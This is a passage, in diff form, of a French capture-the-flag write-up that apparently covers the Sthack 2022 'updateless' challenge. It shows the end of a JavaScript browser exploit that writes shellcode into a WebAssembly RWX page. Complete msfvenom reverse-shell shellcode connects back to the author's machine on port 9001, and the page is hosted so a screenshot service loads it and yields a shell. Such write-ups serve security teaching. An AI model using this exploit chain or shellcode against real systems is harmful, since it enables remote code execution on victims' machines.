+<span class="kd">var</span> <span class="nx">rwx_page_addr</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">arbread</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x68</span><span class="nx">n</span><span class="p">));</span>
+<span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
+<span class="nx">wasm_main_func</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>Il nous faut changer le shellcode présent au début de l’exploit par un shellcode permettant d’exécuter un reverse shell vers notre machine.
+Nous utilisons pour cela msfvenom.</p>
+
+<p><img src="/assets/img/sthack2022/updateless/img_7.png" alt="img_7.png" /></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">shellcode</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x29</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x99</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x5e</span><span class="p">,</span><span class="mh">0x0f</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x97</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xb9</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x23</span><span class="p">,</span><span class="mh">0x29</span><span class="p">,</span><span class="mh">0xc0</span><span class="p">,</span><span class="mh">0xa8</span><span class="p">,</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe6</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x2a</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x0f</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x5e</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xce</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x21</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x0f</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0xf6</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x3b</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x99</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x62</span><span class="p">,</span><span class="mh">0x69</span><span class="p">,</span><span class="mh">0x6e</span><span class="p">,</span><span class="mh">0x2f</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe7</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe6</span><span class="p">,</span><span class="mh">0x0f</span><span class="p">,</span><span class="mh">0x05</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<p>Après transformation et remplacement du shellcode présent dans l’exploit, nous incluons ce code Javascript dans une page HTML que nous hébergeons.
+Nous indiquons ensuite l’URL de cette page au service de screenshot et lançons un netcat en écoute sur le port 9001.</p>
+
+<p>Le serveur Web reçoit une requête.</p>
+
+<p><img src="/assets/img/sthack2022/updateless/img_8.png" alt="img_8.png" /></p>
+
+<p>Puis nous obtenons un shell.</p>
+
+<p><img src="/assets/img/sthack2022/updateless/img_9.png" alt="img_9.png" /></p>
+
+
+    </div>
+</div>
+
+
+    </div>
+  </body>
+</html>
